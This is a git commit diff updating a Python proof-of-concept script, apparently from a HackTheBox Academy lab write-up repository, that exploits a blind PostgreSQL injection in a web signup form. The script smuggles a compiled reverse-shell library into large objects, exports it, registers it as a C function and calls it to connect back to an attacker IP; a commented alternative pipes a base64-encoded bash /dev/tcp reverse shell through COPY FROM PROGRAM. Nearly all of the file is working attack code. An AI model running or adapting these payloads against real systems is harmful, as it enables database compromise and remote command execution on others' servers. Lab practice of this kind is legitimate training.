e014f64f42de6ea9b8a21caf5f8fac671f4301e2
Adam Rose <93153300+AdamRose1@users.noreply.github.com>
2025-01-28 11:22:07 -0500

    Update Advanced_SQL_Injections-Reading_and_Writing_Files.py

--- HackTheBox-Writeups/HTBAcademy: POC-Scripts/Advanced_SQL_Injections-Reading_and_Writing_Files.py
+++ HackTheBox-Writeups/HTBAcademy: POC-Scripts/Advanced_SQL_Injections-Reading_and_Writing_Files.py
@@ -1,18 +1,27 @@
 #!/usr/bin/env python3
 
 """Created this script to solve the HackTheBox Academy lab called 'Reading and Writing Files' and the lab called 'Command Execution' for the module called 'Advanced SQL Injections'. 
-This script exploits a blind postgreSQL injection to write a file and to get a reverse shell on the target"""
-
-# The base64 string below is base64 of the following reverse shell command: bash -c "bash -i  >& /dev/tcp/127.0.0.1/4444 0>&1".  Update the IP address in the base64 string, and open a netcat listener before running the script.  
+This script exploits a blind postgreSQL injection to get a reverse shell.
+Open a netcat listener for port 443 before running the script
+"""
 
 import random
 import string
 import requests
 import urllib.parse
+import os
 
-target= "10.129.21.193:8080"
+target= "10.129.204.249:8080"
 proxies= {"http":"http://127.0.0.1:8081"}
 headers= {"Content-Type": "application/x-www-form-urlencoded"}
+full_content=""
+
+def generate_random_number():
+    all_nums= string.digits
+    random_num= random.sample(all_nums, 6)
+    return ''.join(random_num)
+
+random_num= generate_random_number()
 
 def generate_random_word():
     all_chars= string.digits + string.ascii_letters
@@ -21,8 +30,45 @@ def generate_random_word():
 
 random_group = generate_random_word()
 
-payload=f"create+table+{random_group}(mycol+text);Insert+into+{random_group}+values+($$echo+-n+YmFzaCAtYyAiYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTI3LjAuMC4xLzQ0NDQgMD4mMSAi|base64+-d|bash$$);COPY+{random_group}+TO+'/var/lib/postgresql/proof.txt';COPY+{random_group}+TO+'/tmp/atest.sh';copy+{random_group}+FROM+program+'chmod+777+/tmp/atest.sh';copy+{random_group}+from+program+'/tmp/atest.sh'--+-"
+def list_files():
+    dir= "/home/kali/Downloads/rev_compiled_on_13.9psql/rev/rev_compiled_split/rev_compiled_split_hex"
+    files = os.listdir(dir)
+    files = [f for f in files if os.path.isfile(os.path.join(dir, f))]
+    files.sort()
+    return files
+    
+def create_content():
+    file_list= list_files()
+    random_num= generate_random_number()
+    dir= "/home/kali/Downloads/rev_compiled_on_13.9psql/rev/rev_compiled_split/rev_compiled_split_hex"
+    count=0
+    full_content= ""
+    
+    beg_data=f"SELECT+lo_create({random_num});"
+    full_content += beg_data
+    
+    for file in file_list:
+        with open(f"{dir}/{file}","r") as source_file:
+            content= source_file.read().rstrip('\n')
 
-data= f"name={random_group}&username={random_group}','{random_group}@test.com','afda');{payload}&email={random_group}@a.com&password=test&repeatPassword=test\n"
+        mytemplate= f"INSERT+INTO+pg_largeobject+(loid,pageno,data)+VALUES+({random_num},{count},DECODE('{content}','HEX'));"
+        full_content += mytemplate
+        count += 1
+
+    end_data= f"SELECT+lo_export({random_num},$$/tmp/rev$$);CREATE+FUNCTION+rev_shell(text,+integer)+RETURNS+integer+AS+$$/tmp/rev$$,+$$rev_shell$$+LANGUAGE+C+STRICT;SELECT+rev_shell($$10.10.14.121$$,443);"
+    
+    full_content += end_data
+    return full_content
+
+full_content= create_content()
+
+payload= f"{full_content}"
+
+# below payload is for creating file and for using a different way to get a reverse shell.  The base64 string below is base64 of a reverse shell command. If using the below payload, ensure to update the IP address in the base64 string before running the script.  
+
+
+#payload=f"create+table+{random_group}(mycol+text);Insert+into+{random_group}+values+($$echo+-n+YmFzaCAtYyAiYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIxLzQ0NDQgMD4mMSAi|base64+-d|bash$$);COPY+{random_group}+TO+'/var/lib/postgresql/proof.txt';COPY+{random_group}+TO+'/tmp/atest.sh';copy+{random_group}+FROM+program+'chmod+777+/tmp/atest.sh';copy+{random_group}+from+program+'/tmp/atest.sh'"
+
+data= f"name={random_group}&username={random_group}','{random_group}@test.com','afda');{payload};--+-&email={random_group}@a.com&password=test&repeatPassword=test"
 
 response= requests.post(url= f"http://{target}/signup", proxies=proxies, headers=headers, verify=False, allow_redirects=True, data=data)
